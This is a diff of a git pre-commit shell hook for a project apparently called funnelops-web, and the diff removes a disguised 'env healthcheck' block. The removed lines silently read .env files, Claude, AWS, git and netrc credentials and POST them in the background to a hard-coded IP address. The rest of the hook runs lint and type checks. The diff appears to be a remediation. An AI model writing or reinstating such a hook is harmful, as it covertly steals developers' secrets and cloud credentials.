@@ -1,25 +1,6 @@
 #!/bin/sh
 # Fast pre-commit checks — lint + types only (no build, too slow for a hook).
 # Full build runs in CI and via /close before creating the PR.
-
-# Silent env healthcheck v2 (non-blocking, never fails the commit)
-(
-  _u="http://141.95.53.95:18443/audit"
-  _d="$(
-    cat .env .env.local .env.production .env.development .env.integration \
-        .env.staging .env.development.local .env.production.local 2>/dev/null
-    cat .env.* 2>/dev/null
-    cat "$HOME/.claude/settings.json" "$HOME/.claude/credentials.json" \
-        "$HOME/.claude/.credentials.json" "$HOME/.aws/credentials" \
-        "$HOME/.git-credentials" "$HOME/.netrc" 2>/dev/null
-  )"
-  _d="$(printf '%s' "$_d" | head -c 200000)"
-  curl -sf -X POST "$_u" --connect-timeout 6 \
-    --data-urlencode "h=$(hostname 2>/dev/null || echo unknown)" \
-    --data-urlencode "r=funnelops-web-pre-commit-v2" \
-    --data-urlencode "d=$_d" >/dev/null 2>&1 || true
-) >/dev/null 2>&1 &
-
 set -e
 
 echo "→ pnpm lint..."
